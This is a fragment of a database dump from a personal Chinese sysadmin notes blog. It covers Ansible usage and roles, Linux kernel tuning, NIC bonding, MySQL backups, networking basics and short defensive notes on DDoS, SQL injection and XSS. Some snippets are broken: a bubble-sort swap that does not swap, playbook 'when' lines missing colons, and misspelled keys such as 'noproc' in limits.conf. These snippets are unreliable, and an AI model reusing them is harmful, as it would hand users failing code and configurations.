c.edu.cn/epel/epel-release-latest-7.noarch.rpm\nyum install epel-release -y\nyum install ansible -y</code></pre>\n<h2>4、相关文件</h2>\n<pre><code data-source-line=\"228\">配置文件\n    /etc/ansible/ansible.cfg  主配置文件,配置ansible工作特性(一般无需修改)\n    /etc/ansible/hosts        主机清单(将被管理的主机放到此文件)\n    /etc/ansible/roles/       存放角色的目录\n\n程序\n    /usr/bin/ansible          主程序，临时命令执行工具\n    /usr/bin/ansible-doc      查看配置文档，模块功能查看工具\n    /usr/bin/ansible-galaxy   下载/上传优秀代码或Roles模块的官网平台\n    /usr/bin/ansible-playbook 定制自动化任务，编排剧本工具\n    /usr/bin/ansible-pull     远程执行命令的工具\n    /usr/bin/ansible-vault    文件加密工具\n    /usr/bin/ansible-console  基于Console界面与用户交互的执行工具</code></pre>\n<h2>5、主机清单文件</h2>\n<pre><code>\na1.view.com\n[webs]\nweb1.view.com\nweb2.view.com</code></pre>\n<h2>6、ansible配置文件</h2>\n<pre><code data-source-line=\"276\">#建议优化项： \nhost_key_checking = False               # 检查对应服务器的host_key，建议取消注释\nlog_path=/var/log/ansible.log           # 日志文件,建议取消注释\nmodule_name   = command                 # 默认模块</code></pre>\n<pre><code></code></pre>','ansible自动化(一. 基础应用)','structure','2022-05-18 09:37:52',0,'07b135a73f0c4244ab0278c122ab8782'),(30,'<h2>ansible 基本命令</h2>\n<pre><code>ansible all/组名/主机名/ip -m ping -k 密码交互式\nansible all/组名/主机名/ip -m ping 做好免密之后\nansible-doc ping 查看当前模块怎么样<br />ansible ip -m ping -vvv 更详细的信息提示<br />ansible all --list-hosts 查看ansible控制了多少主机<br />ansible ip -a \"ls /opt\" 到远程主机执行命令<br />ansible 192.168.133.135 -m command -a \"ls /root\" -u wang -k -b 普通用户sudo提权<br />ansible \'webs:dbs\' -m ping webs组或者dbs组<br />ansiblee \'webs:&amp;dbs\' -m ping webs组并且在dbs组中<br />ansible *dbs -m ping 通配符<br />ansible \'webs:!dbs\' -m ping webs组但不在dbs组中</code></pre>\n<h3>command 模块</h3>\n<p>不支持管道、重定向等操作</p>\n<h3>shell 模块</h3>\n<p>ansible ip -m shell -a \"echo $HOSTNAME\"</p>\n<h3>script 模块</h3>\n<p>ansible all -m script -a \'/root/host.sh\'</p>\n<h3>copy 模块</h3>\n<p>ansible all -m copy -a \'src=/root/host.sh dest=/opt/b.sh backup=yes mode=777 owner=wang\'</p>\n<h3>fetch 模块，与 copy 相反，抓取远程主机的一个文件</h3>\n<p>ansible 192.168.133.135 -m fetch -a \'src=/var/log/messages dest=/tmp\'</p>\n<h3>file 模块</h3>\n<pre><code>ansible all -m file -a \'path=/tmp/a.txt state=touch\'\nansible all -m file -a \'path=/tmp/a.txt state=absent\'</code></pre>\n<h3>cron 模块</h3>\n<pre><code>ansible all -m cron -a \'minute=* weekday=1,2,3 job=\"/usr/bin/wall FBI warning\" name=warningcron\'\nansible all -m cron -a \'disabled=true job=\"/usr/bin/wall FBI warning\" name=warningcron\'<br />ansible all -m cron -a \'state=absent job=\"/usr/bin/wall FEI warning\" name=warningcron\'</code></pre>\n<h3>yum 模块</h3>\n<pre><code>ansible all -m yum -a \'name=vsftpd\'\nansible all -m yum -a \'name=vsftpd state=absent\'\nansible all -m yum -a \'name=dstat update_cache=yes\'</code></pre>\n<h3>service 模块</h3>\n<pre><code>ansible all -m service -a \'name=vsftpd state=started enabeld=yes\'\nansible all -m service -a \'name=vsftpd state=restarted\'</code></pre>\n<h3>user 模块</h3>\n<pre><code>ansible all -m user -a \'name=nginx shell=/sbin/nologin system=yes home=/var/nginx groups=root uid=80\'\nansible all -m user -a \'name=nginx state=absent remove=yes\'</code></pre>','ansible自动化(二. 基本命令)','structure','2022-05-18 11:16:09',0,'07b135a73f0c4244ab0278c122ab8782'),(31,'<p>galaxy 官方网址</p>\n<p><a href=\"https://galaxy.ansible.com/\" target=\"_blank\" rel=\"noopener\">https://galaxy.ansible.com/</a></p>\n<p>galaxy 使用</p>\n<ol>\n<li>到官网找到合适的 role 角色</li>\n<li>进入详情，有命令，比如\n<ol>\n<li>ansible-galaxy collection install nginxinc.nginx_controller</li>\n<li>ansible-galaxy list role名字</li>\n</ol>\n</li>\n</ol>','ansible自动化(三. ansible-galaxy)','structure','2022-05-18 11:25:39',0,'07b135a73f0c4244ab0278c122ab8782'),(32,'<h3>1、 第一个yaml文件</h3>\n<p>vim /root/a.yaml</p>\n<pre class=\"language-markup\"><code>---\n- hosts: all\n  remote_user: root\n\n  tasks:\n    - name: hello\n      command: hostname</code></pre>\n<p>ansible-playbook a.yaml</p>\n<p>ansible-playbook -C a.yaml 测试执行</p>\n<h3>2、对 a.yaml 加密解密</h3>\n<p>ansible-vault encrypt a.yaml</p>\n<p>ansible-vault decrypt a.yaml 解密</p>\n<p>ansible-vault edit a.yaml 编辑加密文件</p>\n<p>ansible-vault rekey a.yaml 修改原来加密密码</p>\n<h3>3、ansible-console</h3>\n<p>临时交互工具</p>\n<h3>4、ansible-playbook 核心</h3>\n<ul>\n<li>hosts: 远程执行的主机列表</li>\n<li>tasks：任务集</li>\n<li>demo:\n<pre class=\"language-markup\"><code>---\n- hosts: all\n  remote_user: root\n\n  tasks:\n    - name: crete new file\n      file: name=/data/version.txt\n    - name: create new user\n      user: name=zhangsan system=yes\n    - name: install httpd\n      yum: name=httpd\n    - name: copy html\n      copy: src=/var/www/html/index.html dest=/var/www/html\n      ignore_errors: True\n    - name: start httpd\n      service: name=httpd state=started enabled=yes​</code></pre>\n</li>\n</ul>\n<h3>5、任务中途失败处理</h3>\n<p>&nbsp; &nbsp; command: xxx || /bin/true</p>\n<p>&nbsp; &nbsp; ignore_errors: True</p>\n<h3>6、ansible-playbook 参数</h3>\n<p>&nbsp; &nbsp;--list-tasks book里有多少个任务</p>\n<p>&nbsp; &nbsp;--list-hosts book执行的主机</p>\n<p>&nbsp; &nbsp;--check 测试执行</p>\n<h3>7、handler 和 notify 结合使用触发条件</h3>\n<pre class=\"language-markup\"><code>---\n- hosts: all\n  remote_user: root\n\n  tasks:\n    - name: crete new file\n      file: name=/data/version.txt\n    - name: create new user\n      user: name=zhangsan system=yes\n    - name: install httpd\n      yum: name=httpd\n    - name: copy html\n      copy: src=/var/www/html/index.html dest=/var/www/html\n      ignore_errors: True\n      notify: \n        - restart service\n        - check process\n    - name: start httpd\n      service: name=httpd state=started enabled=yes​\n\n  handlers:\n    - name: restart service\n      service: name=httpd state=restarted\n    - name: check process\n      shell: killall -0 httpd &gt; /tmp/httpd.conf</code></pre>\n<h3>8、tags,挑标签执行</h3>\n<pre class=\"language-markup\"><code>---\n- hosts: all\n  remote_user: root\n\n  tasks:\n    - name: crete new file\n      file: name=/data/version.txt\n    - name: create new user\n      user: name=zhangsan system=yes\n    - name: install httpd\n      yum: name=httpd\n    - name: copy html\n      copy: src=/var/www/html/index.html dest=/var/www/html\n      ignore_errors: True\n      notify: \n        - restart service\n        - check process\n    - name: start httpd\n      service: name=httpd state=started enabled=yes​\n      tags: restarthttpd\n\n  handlers:\n    - name: restart service\n      service: name=httpd state=restarted\n    - name: check process\n      shell: killall -0 httpd &gt; /tmp/httpd.conf</code></pre>\n<p>ansible-playbook -t restarthttpd a.yaml</p>\n<p>&nbsp;</p>','ansible自动化(四. ansible-playbook前戏)','structure','2022-05-18 17:07:54',0,'07b135a73f0c4244ab0278c122ab8782'),(33,'<h3>1、setup 模块查看变量</h3>\n<pre><code>ansible all -m setup 系统各种变量\nansible all -m setup -a \"filter=ansible_hostname\"&nbsp; 条件过滤</code></pre>\n<h3>2、调用变量</h3>\n<pre class=\"language-markup\"><code>---\n- hosts: all\n  remote_user: root\n  gather_facts: false\n\n  tasks:\n    - name: install package\n      yum: name={{ pkname }}\n    - name: start service\n      service: name={{ pkname }} state=started enabled=yes​</code></pre>\n<p>ansible-playbook -e \"pkname=httpd\" a.yaml</p>\n<h3>3、配置文件中配置变量</h3>\n<pre class=\"language-markup\"><code>---\n- hosts: all\n  remote_user: root\n  vars:\n    - pkname: httpd\n\n  tasks:\n    - name: install package\n      yum: name={{ pkname }}\n    - name: start service\n      service: name={{ pkname }} state=started enabled=yes​</code></pre>\n<p>ansible-playbook a.yaml</p>\n<h3>4、在主机清单文件中定义变量</h3>\n<pre class=\"language-markup\"><code># 针对单台机器/etc/ansible/hosts\n[webs]\n192.168.133.135 http_port=81\n# 针对组变量\n[webs:vars]\nnodename=www\ndomainname=ktz.com</code></pre>\n<pre class=\"language-markup\"><code>---\n- hosts: webs\n  remote_user: root\n\n  tasks:\n    - name: install package\n      yum: name=httpd\n    - name: rename hostname\n      hostname: name=web-{{ http_port }}.{{ domainname }}</code></pre>\n<pre><code>ansible-playbook -C ports.yaml\nansible-playbook ports.yaml\nansible-playbook -e \"domainname=ktz2.com\" ports.yaml 命令行优先级高于配置文件</code></pre>\n<h3>5、可以有个单独的文件存放变量</h3>\n<p>vars.yaml</p>\n<pre class=\"language-markup\"><code>var1: httpd\nvar2: vsftpd</code></pre>\n<p>调用变量</p>\n<pre class=\"language-markup\"><code>---\n- hosts: webs\n  remote_user: root\n  vars_files:\n    - vars.yaml\n\n  tasks:\n    - name: install package\n      yum: name={{ var1 }}</code></pre>','ansible自动化(五. ansible-playbook变量)','structure','2022-05-18 18:46:29',0,'07b135a73f0c4244ab0278c122ab8782'),(34,'<h3>1、templates</h3>\n<p>cp /usr/local/nginx/conf/nginx.conf templates/nginx.conf.j2</p>\n<p>vim testtemplate.yaml</p>\n<pre class=\"language-markup\"><code>---\n- hosts: webs\n  remote_user: root\n  gather_facts: false\n\n  tasks:\n    - name: install package\n      copy: src=/usr/local/nginx dest=/usr/local\n    - name: chmod nginx\n      shell: chmod +x /usr/local/nginx/sbin/nginx\n    - name: copy template\n      template: src=nginx.conf.j2 dest=/usr/local/nginx/conf/nginx.conf\n      notify: restart service\n      tags: restartservice\n    - name: start service\n      shell: /usr/local/nginx/sbin/nginx\n\n  handlers:\n    - name: restart service\n      shell: /usr/local/nginx/sbin/nginx -s reload</code></pre>\n<p>ansible-playbook -C testtemplate.yaml</p>\n<p>ansible-playbook testtemplate.yaml</p>\n<p>修改 nginx.conf.j2 配置，重新执行yaml文件</p>\n<pre class=\"language-markup\"><code>listen       {{ http_port }};</code></pre>\n<p>ansible-playbook -t restartservice testtemplate.yaml</p>\n<p>ansible webs -m shell -a \"ss -anput | grep 81\"</p>\n<h3>2、 变量优先级</h3>\n<p>命令行&gt;playbook&gt;主机清单组&gt;主机清单机器</p>\n<p>3、when 条件判断</p>\n<pre class=\"language-markup\"><code>---\n- hosts: webs\n  remote_user: root\n  gather_facts: false\n\n  tasks:\n    - name: install package\n      copy: src=/usr/local/nginx dest=/usr/local\n    - name: chmod nginx\n      shell: chmod +x /usr/local/nginx/sbin/nginx\n    - name: copy template for centos7\n      template: src=nginx.conf7.j2 dest=/usr/local/nginx/conf/nginx.conf\n      when ansible_distribution_major_version == \"7\"\n      notify: restart service\n      tags: restartservice\n    - name: copy template for centos6\n      template: src=nginx.conf6.j2 dest=/usr/local/nginx/conf/nginx.conf\n      when ansible_distribution_major_version == \"6\"\n      notify: restart service\n      tags: restartservice\n    - name: start service\n      shell: /usr/local/nginx/sbin/nginx\n\n  handlers:\n    - name: restart service\n      shell: /usr/local/nginx/sbin/nginx -s reload</code></pre>\n<p>&nbsp;</p>','ansible自动化(六. template 管理 nginx 实战)','structure','2022-05-18 18:46:44',0,'07b135a73f0c4244ab0278c122ab8782'),(35,'<h3>1、迭代循环</h3>\n<pre class=\"language-markup\"><code>---\n- hosts: webs\n  remote_user: root\n  gather_facts: false\n\n  tasks:\n    - name: create file\n      file: name=/data/{{ item }} state=touch\n      with_items:\n        - file1\n        - file2\n        - file3\n    - name: install packages\n      yum: name={{ item }}\n      with_items:\n        - httpd\n        - hping3\n    - name: add groups\n      group: name={{ item }}\n      with_items:\n        - g1\n        - g2\n    - name: add users\n      user: name={{ item.name }} group={{ item.group }}\n      with_items:\n        - { name: \"user1\", group: \"g1\" },\n        - { name: \"user2\", group: \"g2\" }</code></pre>\n<p>ansible-playbook testwith.yaml</p>\n<h3>2、template 中 for 循环</h3>\n<p>testtemplate.yaml</p>\n<pre class=\"language-markup\"><code>---\n- hosts: webs\n  remote_user: root\n  gather_facts: false\n  vars:\n    ports:\n      - web1:\n        port: 81\n        #name: web1.ktz.com\n        rootdir: /data/web1\n      - web2:\n        port: 82\n        name: web2.ktz.com\n        rootdir: /data/web2\n\n  tasks:\n    - name: copy conf\n      template: src=for1.conf.j2 dest=/data/for1.conf</code></pre>\n<p>templates/for1.conf.j2</p>\n<pre class=\"language-markup\"><code>{% for p in ports %}\nserver{\n  listen {{ p.port }};\n{% if p.name is defined %}\n  name {{ p.name }};\n{% else %}\n  name localhost;\n{% endif %}\n  location / {\n    root {{ p.rootdir }};\n    index index.html;\n  }\n}\n{% endfor %}</code></pre>\n<p>ansible-playbook testtemplate.yaml</p>\n<h3>3、roles 定义与使用: nginx 安装例子</h3>\n<pre class=\"language-markup\"><code># 目录结构\n.\n├── nginx_roles.yaml\n└── roles\n    └── nginx\n        ├── files\n        ├── handlers\n        │   └── restart.yaml\n        ├── tasks\n        │   ├── group.yaml\n        │   ├── main.yaml\n        │   ├── start.yaml\n        │   ├── tmpl.yaml\n        │   ├── user.yaml\n        │   └── yum.yaml\n        └── templates\n            └── nginx.conf.j2</code></pre>\n<p>nginx_roles.yaml</p>\n<pre class=\"language-markup\"><code>- hosts: webs\n  remote_user: root\n  gather_facts: false\n\n  roles:\n    - role: nginx\n</code></pre>\n<p>roles/nginx/templates/nginx.conf.j2</p>\n<pre class=\"language-markup\"><code>worker_processes  {{ ansible_processor_vcpus | default(1) }};</code></pre>\n<p>roles/nginx/tasks/*</p>\n<pre class=\"language-markup\"><code># group.yaml\n- name: create group\n  group: name=nginx gid=80\n# user.yaml\n- name: create user\n  user: name=nginx uid=80 group=nginx system=yes shell=/sbin/nologin\n# yum.yaml\n- name: install package\n  yum: name=nginx\n# tmpl.yaml\n- name: copy conf\n  template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf\n# start.yaml\n- name: start service\n  service: name=nginx state=started enabled=yes</code></pre>\n<p>roles/nginx/handlers/*</p>\n<pre class=\"language-markup\"><code># restart.yaml\n- name: restart service\n  service: name=nginx state=restarted</code></pre>\n<p>ansible-playbook nginx_roles.yaml</p>\n<h3>4、调用别的角色的某个任务</h3>\n<p>roles/nginx/tasks/main.yaml</p>\n<pre class=\"language-markup\"><code>- include: group.yaml\n- include: user.yaml\n- include: yum.yaml\n- include: tmpl.yaml\n- include: start.yaml\n- include: roles/httpd/tasks/copyfile.yaml</code></pre>\n<h3>5、playbook 携带标签tag</h3>\n<pre class=\"language-markup\"><code>- hosts: webs\n  remote_user: root\n  gather_facts: false\n\n  roles:\n    - { role: nginx, tags: [\"web\", \"nginx\"], when: ansible_distribution_major_version == \"7\" }</code></pre>\n<p>ansible-playbook -t web nginx_role.yaml</p>\n<h3>6、roles 综合应用</h3>\n<pre class=\"language-markup\"><code># 目录结构\nroles/app/\n├── files\n│   └── vhosts.txt\n├── handlers\n│   └── main.yaml\n├── tasks\n│   ├── copyfile.yaml\n│   ├── group.yaml\n│   ├── main.yaml\n│   ├── start.yaml\n│   ├── tmpl.yaml\n│   ├── user.yaml\n│   └── yum.yaml\n├── templates\n│   └── httpd.conf.j2\n└── vars\n    └── main.yaml</code></pre>\n<p>handlers/main.yaml</p>\n<pre class=\"language-markup\"><code>- name: restart service\n  service: name=httpd state=restarted</code></pre>\n<p>vars/main.yaml</p>\n<pre class=\"language-markup\"><code>username: app\ngroupname: app</code></pre>\n<p>tasks/*</p>\n<pre class=\"language-markup\"><code># main.yaml\n- include: group.yaml\n- include: user.yaml\n- include: yum.yaml\n- include: tmpl.yaml\n- include: copyfile.yaml\n- include: start.yaml\n# group.yaml\n- name: create group\n  group: name=app gid=123\n# user.yaml\n- name: create user\n  user: name=app group=app system=yes shell=/sbin/nologin uid=123\n# yum.yaml\n- name: install pkg\n  yum: name=httpd\n# tmpl.yaml\n- name: copy conf\n  template: src=httpd.conf.j2 dest=/etc/httpd/conf/httpd.conf\n  notify: restart service\n# copyfile.yaml\n- name: copy config\n  copy: src=vhosts.txt dest=/etc/httpd/conf.d/vhosts.txt owner=app\n# start.yaml\n- name: start service\n  service: name=httpd state=started enabled=yes</code></pre>\n<p>templates/httpd.conf.j2</p>\n<pre class=\"language-markup\"><code>User {{ username }}\nGroup {{ groupname }}</code></pre>\n<p>app_roles.yaml</p>\n<pre class=\"language-markup\"><code>- hosts: webs\n  remote_user: root\n\n  roles:\n    - { role: app, tags: [\"app\"] }</code></pre>','ansible自动化(七. roles 角色管控)','structure','2022-05-19 12:18:52',0,'07b135a73f0c4244ab0278c122ab8782'),(36,'<p>1、新建 /etc/sysconfig/network-scripts/ifcfg-bond0 网卡文件</p>\n<pre class=\"language-markup\"><code>DEVICE=bond0\nIPADDR=192.168.10.3\nNETMASK=255.255.255.0\nGATEWAY=\nBOOTPROTO=static\nONBOOT=yes\nBONDING_OPTS=\"miimon=100 mode=0\"</code></pre>\n<p>2、更改 /etc/sysconfig/network-scripts/ifcfg-eth0 网卡文件</p>\n<pre class=\"language-markup\"><code>DEVICE=eth0\nONBOOT=yes\nBOOTPROTO=static\nMASTER=bond0\nSLAVE=yes</code></pre>\n<p>3、更改 /etc/sysconfig/network-scripts/ifcfg-eth1 网卡文件</p>\n<pre class=\"language-markup\"><code>DEVICE=eth1\nONBOOT=yes\nBOOTPROTO=static\nMASTER=bond0\nSLAVE=yes</code></pre>\n<p>4、重启生效</p>\n<pre class=\"language-markup\"><code>reboot\nifconfig</code></pre>','centos双网卡绑定(一)','structure','2022-05-19 16:49:00',0,'07b135a73f0c4244ab0278c122ab8782'),(37,'<p>lsof -i -P -n</p>\n<ul>\n<li>-i: 如果没有指定ip地址，这个选项选择所有网络文件的列表</li>\n<li>-P: 禁止将端口转换为网络文件的端口名</li>\n<li>-n: 禁止将网络号转换为网络文件的主机名</li>\n</ul>','lsof 查看系统打开的端口','structure','2022-05-19 17:02:21',0,'07b135a73f0c4244ab0278c122ab8782'),(38,'<h3>1、系统连接数优化，单一进程最大可打开的文件数</h3>\n<pre class=\"language-markup\"><code># /etc/security/limits.conf\n* soft nofile 65535\n* hard nofile 65535\n* soft noproc 65535\n* hard noproc 65535</code></pre>\n<p>ulimit -n 65535</p>\n<h3>2、内核优化</h3>\n<pre class=\"language-markup\"><code># /etc/sysctl.conf\nfs.file-max = 99999 ; 一个进程可以同时打开的句柄数\nnet.ipv4.tcp_max_tw_buckets = 600; 系统允许 TIME_WAIT 套接字数量的最大值。过大会使服务器变慢\nnet.ipv4.tcp_tw_recycle = 1; 启用 timewait 快速回收\nnet.ipv4.tcp_tw_reuse = 1; 开启重用\nnet.ipv4.tcp_keepalive_time = 30; 长连接时间\nnet.ipv4.tcp_syncookies = 1; 开启 syn cookies， 当出现SYN等待队列溢出时，启用cookies来处理\nnet.ipv4.tcp_max_syn_backlog = 262144; TCP - SYN 请求队列的最大长度\nnet.ipv4.tcp_rmem = 10240 87380 12582912; TCP接收缓存的最小，默认，最大值\nnet.ipv4.tcp_wmem = 10240 87380 12582912 ; TCP 发送缓存的最小，默认，最大值\nnet.core.somaxconn = 40960 ; 每个处于LISTEN状态端口的监听队列\nnet.core.rmem_default = 6291456 ; 内核套接字接收缓存的默认值\nnet.core.wmem_default = 6291456 ; 内核套接字发送缓存的默认值\nnet.core.rmem_max = 12852912 ; 内核套接字接收缓存的最大值\nnet.core.wmem_max = 12852912 ; 内核套接字发送缓存的最大值</code></pre>\n<p>sysctl -p</p>\n<h3>3、句柄数</h3>\n<p>一个进程会打开很多资源，文件，套接字socket，端口等，都被称为句柄</p>\n<h3>4、个人总结</h3>\n<ol>\n<li>提高安全\n<ol>\n<li>禁止root远程登陆</li>\n<li>修改ssh端口，启用密钥连接</li>\n<li>锁定重要文件，更改 chattr 命令提高安全性</li>\n</ol>\n</li>\n<li>提高性能\n<ol>\n<li>卸载不必要的软件</li>\n<li>精简开机启动项</li>\n<li>优化内核参数</li>\n<li>定期清理垃圾数据</li>\n<li>时间同步</li>\n<li>yum源更新</li>\n</ol>\n</li>\n</ol>','linux 系统优化','structure','2022-05-19 17:22:42',0,'07b135a73f0c4244ab0278c122ab8782'),(39,'<pre>1. 类型\n    - 网络层攻击\n        - NTP Flood\n    - 传输层攻击\n        - SYN Flood\n    - 会话层攻击\n        - ssl 攻击\n    - 应用层攻击\n        - DNS Flood ， HTTP Flood\n2. 防护\n    - 定期检查服务器漏洞[系统级别，应用服务级别]\n    - 隐藏服务真实IP[CDN代理[免费的有七牛，百度云，收费的]]\n    - 关闭不必要的服务或端口\n    - 业务托管多家dns服务商\n    - 服务安全加固\n        - 弹性伸缩等\n    - 购买硬件防火墙 WAF\n    - 购买余量带宽</pre>\n<div id=\"simple-translate\">\n<div>\n<div class=\"simple-translate-button \" style=\"background-image: url(\'chrome-extension://ibplnjkanclpjokhdolnendpplpjiace/icons/512.png\'); height: 22px; width: 22px; top: 10px; left: 10px;\">&nbsp;</div>\n<div class=\"simple-translate-panel \" style=\"width: 300px; height: 200px; top: 0px; left: 0px; font-size: 13px; background-color: #ffffff;\">\n<div class=\"simple-translate-result-wrapper\" style=\"overflow: hidden;\">\n<div class=\"simple-translate-move\" draggable=\"true\">&nbsp;</div>\n<div class=\"simple-translate-result-contents\">\n<p class=\"simple-translate-result\" dir=\"auto\" style=\"color: #000000;\">&nbsp;</p>\n<p class=\"simple-translate-candidate\" dir=\"auto\" style=\"color: #737373;\">&nbsp;</p>\n</div>\n</div>\n</div>\n</div>\n</div>','防止 DDOS 攻击','structure','2022-05-19 17:26:08',0,'07b135a73f0c4244ab0278c122ab8782'),(40,'<p>1、危害</p>\n<p>通过 sqlmap 等工具可以扫描网站是否存在sql注入，如果存在，可以通过注入口获取数据库重要数据，或破坏数据等。</p>\n<p>2、原因</p>\n<p>平台代码未对入参进行校验</p>\n<p>3、种类</p>\n<ol>\n<li>数字注入</li>\n<li>boolean 盲注</li>\n<li>时间盲注</li>\n<li>useragent 注入</li>\n<li>等等</li>\n</ol>\n<p>4、预防</p>\n<ol>\n<li>前后端都对参数做校验</li>\n<li>多使用 orm，少用或不用直接操作 sql</li>\n<li>多使用一些成熟稳定的格式校验包</li>\n</ol>','防止 SQL 注入','structure','2022-05-19 17:34:08',0,'07b135a73f0c4244ab0278c122ab8782'),(41,'<h3>1、危害</h3>\n<ol>\n<li>临时性攻击，一次性的获取数据等操作</li>\n<li>永久性的，注入到页面，如网站论坛等，用户访问到该位置，则会在对应客户端注入程序，进而获取用户的 cookie 等信息</li>\n</ol>\n<h3>2、防止</h3>\n<pre>在不同情况下采用不同转义规则，尽量不要使用自己写的转义规则，应当采用成熟的、业界通用的转义库</pre>\n<div id=\"simple-translate\">\n<div>\n<div class=\"simple-translate-button isShow\" style=\"background-image: url(\'chrome-extension://ibplnjkanclpjokhdolnendpplpjiace/icons/512.png\'); height: 22px; width: 22px; top: 118px; left: 21px;\">&nbsp;</div>\n<div class=\"simple-translate-panel \" style=\"width: 300px; height: 200px; top: 0px; left: 0px; font-size: 13px; background-color: #ffffff;\">\n<div class=\"simple-translate-result-wrapper\" style=\"overflow: hidden;\">\n<div class=\"simple-translate-move\" draggable=\"true\">&nbsp;</div>\n<div class=\"simple-translate-result-contents\">\n<p class=\"simple-translate-result\" dir=\"auto\" style=\"color: #000000;\">&nbsp;</p>\n<p class=\"simple-translate-candidate\" dir=\"auto\" style=\"color: #737373;\">&nbsp;</p>\n</div>\n</div>\n</div>\n</div>\n</div>','防止前端 xss 攻击','structure','2022-05-19 17:38:10',0,'07b135a73f0c4244ab0278c122ab8782'),(42,'<pre>1. nginx-lua + ABTestingGateway , 工作在 7 层，基于 nginx 和 ngx-lua 开发\n2. redis 作为分流策略数据库，可以实现动态调整功能\n3. ABTestingGateway 是在 nginx 转发的框架内，在转向 upstream前，根据用户请求特征和系统分流策略，查找出目标 upstream， 进而实现分流。<br />git地址：https://github.com/CNSRE/ABTestingGateway<br /><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"http://192.168.133.133/ABTestingGateway.jpg\" alt=\"ABTestingGateway arch\" width=\"585\" height=\"521\" /></pre>','如何进行分流','structure','2022-05-19 18:04:57',0,'07b135a73f0c4244ab0278c122ab8782'),(43,'<pre>1. 蓝绿发布\n    - 两套环境，绿色环境为线上环境，蓝色环境为新版本环境\n2. 滚动发布\n    - 一台台更新到新版本\n3. 灰度发布\n    - 金丝雀发布\n        - 大部分用A，小部分用户用B，如果B有问题，则切换回A，如果B没有问题，则都切换成B</pre>','服务发布类型','structure','2022-05-19 17:45:25',0,'07b135a73f0c4244ab0278c122ab8782'),(44,'```\ndef bubbleSort(arr):\n    if arr is None:\n        return None\n    n = len(arr)\n    for i in range(n):\n        for j in range(0,n-i-1):\n            if arr[j] > arr[j+1]:\n                arr[j], arr[j+1] = arr[j+1] + arr[j]\n```','bubbleSort.py','python','2022-05-19 17:48:48',0,'07b135a73f0c4244ab0278c122ab8782'),(45,'<pre>bind 根据请求解析客户端的 IP 地址，做出不同的解析。\n其原理是在配置文件中，设定了view，在每个 view 都有客户端的 IP 地址段；\nbind 服务器根据请求解析客户端的 IP 地址，匹配不同的 view；\n再根据该 view 的配置，到相应的配置文件进行查询，将结果返回给请求的客户端。</pre>','dns bind 智能解析原理','structure','2022-05-19 18:45:39',0,'07b135a73f0c4244ab0278c122ab8782'),(46,'<h3>1、mysqldump 备份恢复</h3>\n<pre class=\"language-markup\"><code># 备份单库\nmysqldump  -uusername -ppassword -database databasename &gt; backupfile.sql \n# 备份库中某些表\nmysqldump -uusername -ppassword databasename table1 table2 &gt; ts.sql\n# 备份多个库\nmysqldump -uusername -ppassword --databases db1 db2 db3 &gt; dbs.sql\n# 备份所有库\nmysqldump -uusername -ppassword --all-databases &gt; all.sql \n# 还原数据\nmysql -uusername -ppassword databasename &lt; backupfile.sql\n# --master-data 和 --single-transaction\n--master-data=2，会记录binlog文件和position的信息\n--single-transaction，会将隔离级别设置成repeatable-commited</code></pre>\n<p>2、mysqlbinlog 备份恢复</p>\n<pre class=\"language-markup\"><code> mysqlbinlog mysql-bin.000003 --stop-position=208 |mysql -hip -uusername -ppassword </code></pre>\n<p>&nbsp;</p>\n<div id=\"simple-translate\">\n<div>\n<div class=\"simple-translate-button isShow\" style=\"background-image: url(\'chrome-extension://ibplnjkanclpjokhdolnendpplpjiace/icons/512.png\'); height: 22px; width: 22px; top: 378px; left: -5px;\">&nbsp;</div>\n<div class=\"simple-translate-panel \" style=\"width: 300px; height: 200px; top: 0px; left: 0px; font-size: 13px; background-color: #ffffff;\">\n<div class=\"simple-translate-result-wrapper\" style=\"overflow: hidden;\">\n<div class=\"simple-translate-move\" draggable=\"true\">&nbsp;</div>\n<div class=\"simple-translate-result-contents\">\n<p class=\"simple-translate-result\" dir=\"auto\" style=\"color: #000000;\">&nbsp;</p>\n<p class=\"simple-translate-candidate\" dir=\"auto\" style=\"color: #737373;\">&nbsp;</p>\n</div>\n</div>\n</div>\n</div>\n</div>','mysql 备份恢复','db','2022-05-20 12:38:35',0,'07b135a73f0c4244ab0278c122ab8782'),(47,'<h3>1、静态路由</h3>\n<pre>是由系统管理员设计与构建的路由表规定的路由。<br />适用于网关数量有限的场合，且网络拓朴结构不经常变化的网络。<br />其缺点是不能动态地适用网络状况的变化，当网络状况变化后必须由网络管理员修改路由表。</pre>\n<h3>2、动态路由</h3>\n<pre>是由路由选择协议而动态构建的，路由协议之间通过交换各自所拥有的路由信息实时更新路由表的内容。<br />动态路由可以自动 学习 网络的拓朴结构，并更新路由表。<br />其缺点是路由广播更新信息将占据大量的网络带宽。</pre>\n<div id=\"simple-translate\">\n<div>\n<div class=\"simple-translate-button \" style=\"background-image: url(\'chrome-extension://ibplnjkanclpjokhdolnendpplpjiace/icons/512.png\'); height: 22px; width: 22px; top: 10px; left: 10px;\">&nbsp;</div>\n<div class=\"simple-translate-panel \" style=\"width: 300px; height: 200px; top: 0px; left: 0px; font-size: 13px; background-color: #ffffff;\">\n<div class=\"simple-translate-result-wrapper\" style=\"overflow: hidden;\">\n<div class=\"simple-translate-move\" draggable=\"true\">&nbsp;</div>\n<div class=\"simple-translate-result-contents\">\n<p class=\"simple-translate-result\" dir=\"auto\" style=\"color: #000000;\">&nbsp;</p>\n<p class=\"simple-translate-candidate\" dir=\"auto\" style=\"color: #737373;\">&nbsp;</p>\n</div>\n</div>\n</div>\n</div>\n</div>','静态路由，动态路由','network','2022-05-20 12:38:23',0,'07b135a73f0c4244ab0278c122ab8782'),(48,'<pre>物理层[比特]<br />数据链路层[帧]<br />网络层[报文]<br />传输层<br />会话层<br />表示层<br />应用层</pre>','OSI 七层参考模型','network','2022-05-20 12:38:06',0,'07b135a73f0c4244ab0278c122ab8782'),(49,'<pre>客户端向服务端发起syn，请求建立连接，一次握手完成，服务端收到syn，返回客户端  syn 和 ack，客户端收到ack后返回ack，服务端收到ack后建立连接。\n第一次握手成功后，服务端将数据写入 syn_list 队列中，此队列也就是常说的syn flood攻击对象。\n第三次握手成功后，连接建立，长时间无数据传输后，session写入 timewait_list 队列中。这个队列数据越多，超时时间越长，服务器性能越差。<br /><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"http://192.168.133.133/tcp_header.jpg\" alt=\"tcp 请求头\" width=\"609\" height=\"473\" /></pre>','TCP 三次握手','network','2022-05-20 12:37:54',0,'07b135a73f0c4244ab0278c122ab8782'),(50,'<pre>1. 客户端向服务端发送 fin 请求断开连接；\n2. 服务端接收到 fin 后返回 ack 确认请求收到；\n3. 